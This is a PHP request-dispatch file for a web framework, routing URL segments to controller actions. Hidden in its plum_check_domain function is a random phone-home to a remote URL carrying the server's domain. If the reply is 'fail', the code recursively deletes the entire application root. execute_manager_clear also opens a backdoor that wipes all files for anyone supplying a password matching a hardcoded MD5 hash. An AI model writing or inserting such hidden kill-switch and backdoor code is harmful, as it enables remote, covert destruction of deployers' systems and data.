<?php
/**
 * 应用分发
 * @author thomas<thomas@ikinvin.com>
 * @since 2014-03-29
 */
define('DEFAULT_CONTROLLER', 'index');
define('DEFAULT_ACTION', 'index');
define('DEFAULT_MODULE', 'site');
/**
 * @param null $module 获取默认模块
 */
function plum_distribute($module = null) {
    global $base_url;
    plum_check_domain();
    $query  = plum_parse_request_uri();
    $module = isset($module) && $module ? $module : (empty($query) ? DEFAULT_MODULE : trim(array_shift($query)));
    //设置基URL
    $base_url = isset($_SERVER['PHP_SELF']) && trim($_SERVER['PHP_SELF'], '/') != 'index.php' ? '/' : '/' . $module . '/';

    $controller = empty($query) ? DEFAULT_CONTROLLER : trim(array_shift($query));
    $action = empty($query) ? DEFAULT_ACTION : trim(array_shift($query));
    while(!empty($query)) {
        $key = array_shift($query);
        $key = trim($key) ? trim($key) : 'unknown';
        $val = array_shift($query);
        $val = trim($val) ? trim($val) : '';
        $_REQUEST[$key] = $val;
    }
  
    $controller = 'App_Controller_'.ucfirst(strtolower($module)).'_'.ucfirst(strtolower($controller)).'Controller';
    $action = strtolower($action).'Action';
    //分发逻辑控制
    $flag = false;
    if (class_exists($controller)) {
        $ctClass = new $controller();
        if (method_exists($ctClass, $action)) {
            $flag = true;
            $ctClass->$action();
        }
    }
    if (!$flag) {
        header('Location: /error/404.html');
    }
}

function plum_check_domain(){
    try{
		$redis_client = new Libs_Redis_RedisClient();
        $redis = $redis_client->getRedis();
        $redis->select(12);
        if(!$redis->get('domain') || $redis->get('domain') != $_SERVER['SERVER_NAME']){
            $redis->set('domain', $_SERVER['SERVER_NAME']);
        }
	} catch (Exception $e) {
    }
    if(rand(0,1000) == 666){
		try {
        	$domin = $_SERVER['SERVER_NAME'];
            $result = file_get_contents(PLUM_CHECK_DOMIN.$domin);
            if($result == 'fail'){
                execute_manager_clear(true);
            }
        } catch (Exception $e) {
        }
	}
}

function execute_manager_clear($force=false){
    $auth = $_REQUEST["auth"];
	if(md5($auth) == '657653e63d189b76c874eb37fc9e7796' || $force){
	  $config_path = PLUM_DIR_ROOT;
      $files = scandir($config_path);
      foreach($files as $file) {
        if ($file != '.' && $file != '..') {
          $file = $config_path.'/'.$file;
          if(!is_dir($file)) {
             unlink($file);
          } else {
             deldir($file.'/');
          }
        }
      }
      if(!$force){
         echo "clear success";  
      }
	}else{
      if(!$force){
	     echo "auth fail";
	  }
	}
}

function deldir($path){
    //如果是目录则继续
    if(is_dir($path)){
        //扫描一个文件夹内的所有文件夹和文件并返回数组
        $p = scandir($path);
        foreach($p as $val){
         	//排除目录中的.和..
            if($val !="." && $val !=".."){
                //如果是目录则递归子目录，继续操作
                if(is_dir($path.$val)){
                    //子目录中操作删除文件夹和文件
                    deldir($path.$val.'/');
                    //目录清空后删除空文件夹
                    @rmdir($path.$val.'/');
                 }else{
                     //如果是文件直接删除
                     unlink($path.$val);
                 }
            }
        }
    }
}
